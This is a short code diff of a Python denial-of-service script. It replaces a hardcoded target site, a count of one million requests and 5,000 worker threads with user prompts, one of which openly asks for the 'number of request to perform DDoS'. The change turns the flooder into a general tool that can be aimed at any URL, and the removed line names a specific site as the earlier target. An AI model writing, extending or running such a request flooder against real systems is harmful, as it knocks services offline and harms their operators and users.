@@ -49,13 +49,13 @@ def send_request(url):
 
 def main():
     # Define the URL
-    url = 'https://sanokam.com/'
+    url = input("Enter target URL: ")
     
     # Number of times to send the request
-    num_requests = 1000000
+    num_requests = input("Enter number of request to perform DDoS: ")
     
     # Maximum number of workers
-    max_workers = 5000
+    max_workers = input("Enter number of workers :")
     
     # Create a ThreadPoolExecutor
     with ThreadPoolExecutor(max_workers=max_workers) as executor:
